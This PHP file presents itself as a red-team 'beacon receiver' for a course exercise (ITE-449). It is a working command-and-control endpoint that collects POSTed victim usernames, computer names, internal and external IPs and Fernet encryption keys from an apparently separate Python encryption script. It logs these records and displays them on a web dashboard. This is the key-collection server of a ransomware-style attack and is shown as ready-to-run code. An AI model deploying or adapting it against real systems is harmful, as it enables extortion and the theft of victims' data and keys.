<?php
/**
 * Red team beacon receiver (ITE-449 cybersecurity exercise).
 *
 * Accepts POST data from the Python encrypt script with:
 *   - username
 *   - computer_name
 *   - internal_ip
 *   - external_ip
 *   - key (Fernet encryption key, base64)
 *
 * Logs each beacon to beacon_log.txt (append) and returns JSON success/error.
 * When visited via browser (GET), shows a simple human-friendly view
 * of recent beacons.
 */

$log_file = __DIR__ . '/beacon_log.txt';

// Human-friendly view for GET requests.
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');

    $entries = [];
    if (file_exists($log_file)) {
        $lines = @file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (is_array($lines)) {
            // Show up to the 50 most recent entries.
            $lines = array_slice(array_reverse($lines), 0, 50);
            foreach ($lines as $line) {
                $data = json_decode($line, true);
                if (is_array($data)) {
                    $entries[] = $data;
                }
            }
        }
    }

    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Beacon Receiver - ITE-449</title>
        <style>
            body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background:#0b0b10; color:#f5f5f5; margin:0; padding:2rem; }
            h1 { margin-top:0; }
            table { border-collapse: collapse; width: 100%; margin-top: 1rem; font-size: 0.9rem; }
            th, td { border: 1px solid #333; padding: 0.4rem 0.6rem; }
            th { background:#151520; }
            tr:nth-child(even) { background:#141420; }
            .mono { font-family: Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
            .pill { display:inline-block; padding:0.1rem 0.4rem; border-radius:999px; background:#222; font-size:0.75rem; }
        </style>
    </head>
    <body>
        <h1>Beacon Receiver</h1>
        <p>Endpoint is <span class="mono">POST /beacon.php</span>. This page shows the most recent beacons written to <span class="mono">beacon_log.txt</span>.</p>
        <?php if (empty($entries)): ?>
            <p><em>No beacon entries logged yet.</em></p>
        <?php else: ?>
            <table>
                <thead>
                <tr>
                    <th>#</th>
                    <th>Timestamp</th>
                    <th>Username</th>
                    <th>Computer</th>
                    <th>Internal IP</th>
                    <th>External IP</th>
                    <th>Key</th>
                </tr>
                </thead>
                <tbody>
                <?php foreach ($entries as $idx => $e): ?>
                    <tr>
                        <td><?php echo $idx + 1; ?></td>
                        <td><?php echo htmlspecialchars((string)($e['timestamp'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['username'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['computer_name'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['internal_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td><?php echo htmlspecialchars((string)($e['external_ip'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                        <td class="mono"><?php echo htmlspecialchars((string)($e['key'] ?? ''), ENT_QUOTES, 'UTF-8'); ?></td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </body>
    </html>
    <?php
    exit;
}

// JSON API for POST beacons.
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$username       = isset($_POST['username'])       ? trim((string) $_POST['username'])       : '';
$computer_name  = isset($_POST['computer_name'])  ? trim((string) $_POST['computer_name'])  : '';
$internal_ip    = isset($_POST['internal_ip'])     ? trim((string) $_POST['internal_ip'])     : '';
$external_ip    = isset($_POST['external_ip'])     ? trim((string) $_POST['external_ip'])     : '';
$key            = isset($_POST['key'])            ? trim((string) $_POST['key'])            : '';

$missing = [];
if ($username === '')      $missing[] = 'username';
if ($computer_name === '') $missing[] = 'computer_name';
if ($internal_ip === '')   $missing[] = 'internal_ip';
if ($external_ip === '')   $missing[] = 'external_ip';
if ($key === '')           $missing[] = 'key';

if (!empty($missing)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Missing: ' . implode(', ', $missing)]);
    exit;
}

$entry = [
    'timestamp'      => date('Y-m-d H:i:s'),
    'username'       => $username,
    'computer_name'  => $computer_name,
    'internal_ip'     => $internal_ip,
    'external_ip'     => $external_ip,
    'key'             => $key,
];

$line = json_encode($entry) . "\n";
if (@file_put_contents($log_file, $line, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Failed to write log']);
    exit;
}

echo json_encode(['ok' => true, 'logged' => $entry]);
